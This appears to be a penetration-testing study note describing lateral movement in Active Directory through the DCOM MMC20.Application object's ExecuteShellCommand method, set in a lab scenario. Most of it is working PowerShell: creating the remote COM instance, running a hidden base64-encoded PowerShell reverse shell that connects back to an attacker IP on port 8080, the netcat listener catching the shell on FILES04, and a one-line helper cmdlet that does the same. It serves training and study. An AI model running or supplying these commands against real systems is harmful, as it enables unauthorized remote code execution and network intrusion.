---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# DCOM

[Recall](../../core-concepts/component-object-model.md#distributed-com) The Microsoft **Component Object Model** (**COM**) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to **Distributed Component Object Model** (**DCOM**) for interaction between multiple computers over a network.

While DCOM is a fairly old technology, it is still a core of the Windows environment. Cybereason has [documented](https://www.cybereason.com/blog/dcom-lateral-movement-techniques) multiple AD Lateral Movement techniques that leverage DCOM. This will focus on a technique leveraging the `MMC20.Application` DCOM object that was [first described](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) by Matt Nelson.

## Example Background

All examples will begin with the compromised `jen` account which is an administrator on the `CLIENT74` machine. The attacker can RDP into this machine and access the command line directly. The attacker will be attempting to move laterally to the `FILES04` machine (`192.168.x.73`).

## MMC20 Application

The [`MMC20.Application`](https://learn.microsoft.com/en-us/previous-versions/system-center/configuration-manager-2003/cc181199\(v=technet.10\)?redirectedfrom=MSDN) DCOM object is designed allow users to script components of the Microsoft Management Console operations. Some enumeration revealed that there is an [`ExecuteShellCommand`](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand?redirectedfrom=MSDN) method under `Document.ActiveView`.

As an administrator one can remotely interact with DCOM via PowerShell by using `[activator]::CreateInstance([type]::GetTypeFromProgID)`. All that must be provided is a DCOM ProgID and an IP address. It will then provide back an instance of that COM object remotely which can be saved into a variable:

{% code overflow="wrap" %}
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.190.73"))
```
{% endcode %}

If desired this object can be examined a bit to see the `ExecuteShellCommand` method:

```powershell
PS C:\Windows\system32> $dcom.Document.ActiveView | Get-Member


   TypeName: System.__ComObject#{6efc2da2-b38c-457e-9abb-ed2d189b8c38}

Name                          MemberType            Definition
----                          ----------            ----------
Back                          Method                void Back ()
Close                         Method                void Close ()
CopyScopeNode                 Method                void CopyScopeNode (Variant)
...
ExecuteScopeNodeMenuItem      Method                void ExecuteScopeNodeMenuItem (string, Variant)
ExecuteSelectionMenuItem      Method                void ExecuteSelectionMenuItem (string)
ExecuteShellCommand           Method                void ExecuteShellCommand (string, string, string, string)
ExportList                    Method                void ExportList (string, ExportListOptions)
...
```

This method can be used to launch a process on the remote machine. The method call structure is:

```
...ExecuteShellCommand(Command, Directory, Parameters, WindowState)
```

Therefore to use the created `$dcom` object to launch the calculator on the remote machine the command would be:

{% code overflow="wrap" %}
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand('C:\Windows\System32\calc.exe', $null, $null, "Minimized")
```
{% endcode %}

While this is interesting it'd be more helpful to launch a shell. Fortunately this can be done with this same method. First an endcoded PowerShell reverse shell launcher will be needed. Fortunately the [`Move-AD`](https://github.com/alex-christine/OSCP\_Exercises/blob/main/Utilities/Tools/Move-AD.psm1) `Get-ShellCommand` cmdlet can be used to create one:

{% code overflow="wrap" %}
```powershell
PS C:\Users\jen> Get-ShellCommand '192.168.45.243' 8080 -Full
powershell.exe -nop -w hidden -enc JABjA...zAGUAKAApAA==
```
{% endcode %}

This whole block can then be substituted in as shown below:

{% code overflow="wrap" %}
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand('powershell.exe', $null, '-nop -w hidden -enc JABjA...zAGUAKAApAA==', '')
```
{% endcode %}

Assuming the attacker has a listener open when the command is run a reverse shell will be opened:

```shell-session
kali@kali:~$ rlwrap nc -lvnp 8080    
listening on [any] 8080 ...
connect to [192.168.45.243] from (UNKNOWN) [192.168.190.73] 49444

PS C:\Windows\system32> hostname
FILES04
PS C:\Windows\system32> whoami
corp\jen
```

### Move-AD

This functionality has also been added to [`Move-AD`](https://github.com/alex-christine/OSCP\_Exercises/blob/main/Utilities/Tools/Move-AD.psm1)'s `Invoke-ReverseShell` cmdlet when run with the `-CreateWith 'mmc20'` flag:

```powershell
Invoke-ReverseShell files04 192.168.45.243 8080 -CreateWith 'mmc20'
```

This call would create a reverse shell on `FILES04` that would reach out to `192.168.45.243:8080`.
